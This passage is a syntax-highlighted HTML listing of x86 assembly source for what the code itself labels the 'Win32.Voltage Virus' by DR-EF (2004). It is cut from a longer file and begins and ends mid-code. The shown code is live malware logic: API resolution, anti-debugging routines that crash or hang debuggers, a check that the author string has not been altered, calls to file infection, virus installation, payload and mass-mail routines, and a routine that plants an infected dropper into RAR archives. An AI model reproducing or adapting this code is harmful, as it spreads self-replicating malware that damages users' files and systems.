    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kernel32base</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">__GetProcAddress</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">NumberOfApis</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ApiNamesTable</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ApiAddressTable</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kernel32base</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_apis</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">Do_Virus_Actions</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ReturnToHost</span><span class="sc0">
</span><span class="sc5">Do_Virus_Actions</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AntiDebug</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">       </span><span class="sc1">;force debugger to jump</span><span class="sc0">
</span><span class="sc5">AntiDebug</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4h</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CrashDebuggers</span><span class="sc0">      </span><span class="sc1">;now if we under debugger we simple crash</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetADVAPI32Apis</span><span class="sc0">
    </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">ReturnToHost</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetUser32Apis</span><span class="sc0">       </span><span class="sc1">;used for debug and payload</span><span class="sc0">
    </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">ReturnToHost</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">AntiLamers</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">HideVirus</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ProcessCommandLine</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">RunFromExeHooker</span><span class="sc4">],</span><span class="sc2">1h</span><span class="sc0"> </span><span class="sc1">;we run from virus exe hooker ?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">ExecuteAndInfectFile</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">InstallVirus</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ReturnToHost</span><span class="sc0">
</span><span class="sc5">ExecuteAndInfectFile</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Infection_Success</span><span class="sc4">],</span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">InfectFile</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">InstallVirus</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PayLoad</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ExecuteFile</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MassMail</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FileDirectory</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ScanDirectoryForRarFiles</span><span class="sc0">
</span><span class="sc5">ReturnToHost</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">RunFromExeHooker</span><span class="sc4">],</span><span class="sc2">1h</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">RetHost</span><span class="sc0">
</span><span class="sc5">Exit_V</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;if we running from virus exe hooker</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;we simple exit</span><span class="sc0">
</span><span class="sc5">RetHost</span><span class="sc4">:</span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">64h</span><span class="sc4">,</span><span class="sc2">0a1h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;mov eax,fs:[00000000]</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    
    </span><span class="sc5">CopyRight</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Win32.Voltage Virus Written By DR-EF (c) 2004"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">SizeOfCopyRight</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">CopyRight</span><span class="sc4">)</span><span class="sc0">
    
</span><span class="sc5">AntiLamers</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CopyRight</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;)</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">SizeOfCopyRight</span><span class="sc0">     
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">             
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">xcrc32</span><span class="sc0">              
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0C3F9A421h</span><span class="sc0">          
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">NoRip</span><span class="sc0">               
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">             
</span><span class="sc5">NoRip</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">ret</span><span class="sc0">                 
    
    
</span><span class="sc5">GetUser32Apis</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">User32dll</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadLibrary</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">NumberOfUser32Functions</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">user32_functions_sz</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">user32_functions_addresses</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_apis</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    
    </span><span class="sc5">User32dll</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"User32.dll"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">user32_functions_sz</span><span class="sc4">:</span><span class="sc0">
    
    </span><span class="sc5">_MessageBox</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"MessageBoxA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">_SetWindowTextA</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"SetWindowTextA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    
    </span><span class="sc5">user32_functions_addresses</span><span class="sc4">:</span><span class="sc0">
    
    </span><span class="sc5">MessageBox</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">SetWindowText</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    
    </span><span class="sc5">NumberOfUser32Functions</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
    
        
</span><span class="sc5">CrashDebuggers</span><span class="sc4">:</span><span class="sc0"> 
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_IsDebuggerPresent</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kernel32base</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">__GetProcAddress</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">NoIDP</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">NoIDP</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">     </span><span class="sc1">;hang debuggers</span><span class="sc0">
</span><span class="sc5">NoIDP</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">ret</span><span class="sc0">
    
    </span><span class="sc5">_IsDebuggerPresent</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"IsDebuggerPresent"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    
    
</span><span class="sc1">;eax - pointer to directory name:</span><span class="sc0">
</span><span class="sc5">ScanDirectoryForRarFiles</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SetCurrentDirectory</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">INVALID_HANDLE_VALUE</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">ExitRarScan</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WIN32_FIND_DATA</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">RarFiles</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FindFirstFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">INVALID_HANDLE_VALUE</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">ExitRarScan</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hfind</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">;save search handle</span><span class="sc0">
</span><span class="sc5">@rar</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">InfectRar</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WIN32_FIND_DATA</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hfind</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FindNextFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">@rar</span><span class="sc0">
</span><span class="sc5">ExitRarScan</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
        
    </span><span class="sc5">RarFiles</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"*.rar"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;rar archive infection procedure:</span><span class="sc0">
</span><span class="sc1">;tested with rar archive's that created using winrar v3.20</span><span class="sc0">
</span><span class="sc5">InfectRar</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">InitRandomNumber</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">nFileSizeLow</span><span class="sc4">],</span><span class="sc2">300000h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">ExitRarInfection</span><span class="sc0">        </span><span class="sc1">;do not infect files that are bigger than 3mb</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Infection_Success</span><span class="sc4">],</span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">usewvltg</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FileToInfect</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">GetLen</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">CopyPth</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">GetLen</span><span class="sc0">
</span><span class="sc5">CopyPth</span><span class="sc4">:</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FileToInfect</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">InfectedDropper</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;use infected file</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">OpenDropper</span><span class="sc0">
</span><span class="sc5">usewvltg</span><span class="sc4">:</span><span class="sc0">   
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0ffh</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">InfectedDropper</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">GetModuleFileName</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;use virus dropper</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">ExitRarInfection</span><span class="sc0">
</span><span class="sc5">OpenDropper</span><span class="sc4">:</span><span class="sc0">    
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">OPEN_EXISTING</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FILE_SHARE_READ</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">GENERIC_READ</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">InfectedDropper</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CreateFile</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;open the infected dropper</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">INVALID_HANDLE_VALUE</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">ExitRarInfection</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hInfectedDropper</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">GetFileSize</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;get dropper file size</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0ffffffffh</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">ExitAndCloseDropperFile</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">DropperSize</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">PAGE_READONLY</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hInfectedDropper</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CreateFileMapping</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;create file mapping object for the dropper</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">ExitAndCloseDropperFile</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hDropperMap</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FILE_MAP_READ</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hDropperMap</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MapViewOfFile</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;map dropper into memory</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0h</span><span class="sc0">
